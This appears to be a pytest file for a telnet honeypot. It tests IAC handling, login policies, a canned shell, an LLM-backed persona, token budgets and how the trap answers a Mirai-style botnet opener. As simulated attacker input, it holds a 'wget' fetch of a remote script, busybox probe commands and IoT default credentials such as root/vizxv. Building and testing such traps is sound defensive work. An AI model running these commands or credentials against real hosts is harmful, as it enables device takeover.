"""Telnet trap tests: IAC handling, login policy, canned shell, persona path and budgets."""

from __future__ import annotations

import asyncio
from types import SimpleNamespace

import pytest

from agents import hooks, shell
from agents.budget import CANNED_INTERACTIVE, Budget, BudgetConfig
from listeners import telnet
from listeners.base import ListenerContext, ServiceSettings
from listeners.events import EventWriter
from scenarios.schema import LoginPolicy

IAC_JUNK = bytes([255, 251, 24, 255, 250, 24, 0, 120, 116, 101, 114, 109, 255, 240])


class FakeHistory:
    def __init__(self, replies: dict[str, str]) -> None:
        self.replies = replies
        self.calls: list[tuple[dict, dict]] = []

    async def ainvoke(self, input, config):
        self.calls.append((input, config))
        text = input["messages"][0].content
        return SimpleNamespace(content=self.replies.get(text, f"-bash: {text}: not found\n"))


@pytest.fixture(autouse=True)
def reset_hooks():
    hooks.reset()
    hooks.set_budget(Budget(BudgetConfig()))  # entry points always set one; fail closed otherwise
    yield
    hooks.reset()


@pytest.fixture
async def telnet_server():
    servers = []

    async def _start(persona=None, accept="after_n", persona_sessions=None):
        writer = EventWriter(None)
        ctx = ListenerContext(writer, bind_host="127.0.0.1", seed="test", persona_history=persona,
                              persona_sessions=persona_sessions)
        settings = ServiceSettings(name="telnet", enabled=True, port=0,
                                   policy=LoginPolicy(accept=accept, after_n_min=2, after_n_max=2))
        ctx.settings["telnet"] = settings
        objs = await telnet.start(ctx, settings)
        servers.extend(objs)
        reader, w = await asyncio.open_connection("127.0.0.1", objs[0].sockets[0].getsockname()[1])
        return writer, reader, w

    yield _start
    for s in servers:
        s.close()


async def read_until(reader, marker: bytes, timeout: float = 3.0) -> bytes:
    # Stop exactly at the marker: bytes that arrive in the same segment (the next prompt
    # after "Login incorrect", say) must stay in the stream for the next call.
    try:
        return await asyncio.wait_for(reader.readuntil(marker), timeout)
    except asyncio.IncompleteReadError as exc:           # peer closed first
        return exc.partial


async def login(reader, w, user: bytes, password: bytes) -> bytes:
    await read_until(reader, b"login: ")
    w.write(IAC_JUNK + user + b"\r\n")
    out = await read_until(reader, b"Password: ")
    assert bytes([255, 251, 1]) in out                       # IAC WILL ECHO before password
    w.write(password + b"\r\0")
    return out


def events(writer, event):
    return [e for e in writer.events if e["event"] == event]


async def test_telnet_fail_then_login_canned_shell(telnet_server):
    writer, reader, w = await telnet_server()
    await login(reader, w, b"admin", b"admin")
    assert b"Login incorrect" in await read_until(reader, b"Login incorrect")
    await login(reader, w, b"root", b"12345")
    banner = await read_until(reader, b"root@srv01:~# ")
    assert b"Welcome to" in banner
    w.write(b"whoami\r\n")
    assert b"root\r\n" in await read_until(reader, b":~# ")
    w.write(b"uname -a\r\n")
    assert b"Linux srv01" in await read_until(reader, b":~# ")
    w.write(b"wget http://198.51.100.7/x.sh\r\n")
    assert b"Connecting to 198.51.100.7:80... failed: Network is unreachable.\r\n" in \
        await read_until(reader, b":~# ")
    w.write(b"exit\r\n")
    assert (await read_until(reader, b"__never__")).endswith(b"logout\r\n")
    attempts = events(writer, "auth_attempt")
    assert [(a["username"], a["password"], a["success"]) for a in attempts] == [
        ("admin", "admin", False), ("root", "12345", True)]
    inputs = [e["data"]["input"] for e in events(writer, "command")]
    assert inputs == ["whoami", "uname -a", "wget http://198.51.100.7/x.sh", "exit"]


async def test_telnet_three_failures_close(telnet_server):
    writer, reader, w = await telnet_server(accept="none")
    for i in range(3):
        await login(reader, w, b"u%d" % i, b"p")
    tail = await read_until(reader, b"__never__")
    assert tail.count(b"Login incorrect") >= 1
    assert len(events(writer, "auth_attempt")) == 3


async def test_telnet_persona_path(telnet_server):
    fake = FakeHistory({"": "Last login: Mon Mar  2 09:14:01 2026\nroot@db01:~# ",
                        "last": "root     pts/0        198.51.100.4     Mon Mar  2 09:14   still logged in\nroot@db01:~# ",
                        "logout": "YYY-END-OF-SESSION-YYY"})
    writer, reader, w = await telnet_server(persona=fake, accept="all")
    await login(reader, w, b"root", b"root")
    first = await read_until(reader, b"root@db01:~# ")
    assert b"Last login" in first and b"\r\n" in first
    w.write(b"last\r\n")
    assert b"still logged in" in await read_until(reader, b"root@db01:~# ")
    w.write(b"logout\r\n")
    assert await read_until(reader, b"__never__") == b""     # closed, nothing written
    texts = [c[0]["messages"][0].content for c in fake.calls]
    assert texts == ["", "last", "logout"]
    assert fake.calls[1][1]["configurable"]["session_id"].startswith("telnet-")
    assert fake.calls[1][0]["username"] == "root"
    cmds = events(writer, "command")
    assert cmds[0]["data"]["input"] == "last" and "pts/0" in cmds[0]["data"]["response"]
    assert cmds[0]["data"]["persona"] is True


async def test_telnet_persona_history_freed_on_close(telnet_server):
    store: dict = {}

    class StoringHistory(FakeHistory):
        async def ainvoke(self, input, config):
            store.setdefault(config["configurable"]["session_id"], []).append(input)
            return await super().ainvoke(input, config)

    fake = StoringHistory({"": "root@db01:~# ", "logout": "YYY-END-OF-SESSION-YYY"})
    writer, reader, w = await telnet_server(persona=fake, accept="all", persona_sessions=store)
    await login(reader, w, b"root", b"root")
    await read_until(reader, b"root@db01:~# ")
    assert len(store) == 1
    w.write(b"logout\r\n")
    assert await read_until(reader, b"__never__") == b""
    for _ in range(50):
        if not store:
            break
        await asyncio.sleep(0.02)
    assert store == {}


async def test_telnet_budget_exhausted_uses_canned_without_model(telnet_server):
    hooks._budget = Budget(BudgetConfig(max_tokens_per_day=0))
    fake = FakeHistory({})
    writer, reader, w = await telnet_server(persona=fake, accept="all")
    await login(reader, w, b"root", b"root")
    out = await read_until(reader, b"__never__")
    assert CANNED_INTERACTIVE.encode() in out
    assert fake.calls == []
    assert any(e["data"].get("reason") == "budget" for e in events(writer, "limit"))


def test_iac_reader_strips_negotiation_across_chunks():
    class FakeConn:
        ctx = SimpleNamespace(limits=SimpleNamespace(max_line_bytes=4096))

    r = telnet.TelnetReader(FakeConn())  # type: ignore[arg-type]
    data = b"ro" + bytes([255]) + bytes([253, 1]) + b"o" + bytes([255, 250, 31, 0, 80]) \
        + bytes([255, 240]) + b"tx\x7f\r\n" + bytes([255, 255]) + b"\n"
    for i in range(len(data)):
        r.feed(data[i:i + 1])
    assert r.lines == [b"root", b"\xff"]


def test_missing_persona_prompt_file_falls_back_to_the_static_shell(tmp_path, monkeypatch):
    """A bad [llm] prompt_file must not stop the listener process; telnet keeps its
    canned shell instead of the model persona."""
    from configparser import ConfigParser

    from listeners.__main__ import build_context

    monkeypatch.setenv("ANTHROPIC_API_KEY", "test-key-not-used")
    cp = ConfigParser()
    cp["honeypot"] = {"log_file": str(tmp_path / "events.jsonl")}
    cp["scenario"] = {"seed": "0" * 64}
    cp["llm"] = {"llm_provider": "anthropic", "model_name": "m", "system_prompt": "s",
                 "prompt_file": str(tmp_path / "missing-prompt.txt")}
    cp["listeners"] = {"bind_host": "127.0.0.1", "quarantine_dir": str(tmp_path / "q"),
                       "llm": "true", "telnet_enabled": "true"}

    ctx = build_context(cp, tmp_path, None, data_dir=str(tmp_path / "data"))

    assert getattr(ctx, "persona_history", None) is None


async def test_telnet_iot_botnet_opener_gets_what_it_expects(telnet_server):
    """A real Mirai-style opener: enable, system, shell, sh, then a busybox applet probe."""
    writer, reader, w = await telnet_server(accept="all")
    await login(reader, w, b"root", b"vizxv")
    await read_until(reader, b"root@srv01:~# ")
    replies = []
    for line in (b"enable", b"system", b"shell", b"sh", b"/bin/busybox ECCHI",
                 b"cat /proc/cpuinfo | grep name | wc -l"):
        w.write(line + b"\r\n")
        replies.append(await read_until(reader, b"root@srv01:~# "))
    # enable is bash's builtin list (the bot reads nothing from it); the rest are silent
    assert replies[0].startswith(b"enable .\r\nenable :\r\n")
    assert replies[0].endswith(b"enable wait\r\nroot@srv01:~# ")
    assert replies[1:4] == [b"root@srv01:~# "] * 3
    assert replies[4] == b"ECCHI: applet not found\r\nroot@srv01:~# "
    cpus = shell.host_for(None, "test").hardware.cpus   # the sensor's own VM shape
    assert replies[5] == f"{cpus}\r\nroot@srv01:~# ".encode()
    cmds = events(writer, "command")
    assert [c["data"]["input"] for c in cmds][:2] == ["enable", "system"]
    assert cmds[4]["data"]["response"].startswith("ECCHI: applet not found")


async def test_telnet_persona_answers_host_facts_without_the_model(telnet_server):
    fake = FakeHistory({"": "root@srv01:~# ", "logout": "YYY-END-OF-SESSION-YYY"})
    writer, reader, w = await telnet_server(persona=fake, accept="all")
    await login(reader, w, b"root", b"root")
    await read_until(reader, b"root@srv01:~# ")
    w.write(b"lspci | grep VGA -c\r\n")
    assert await read_until(reader, b"root@srv01:~# ") == b"1\r\nroot@srv01:~# "
    w.write(b"logout\r\n")
    assert await read_until(reader, b"__never__") == b""
    assert [c[0]["messages"][0].content for c in fake.calls] == ["", "logout"]
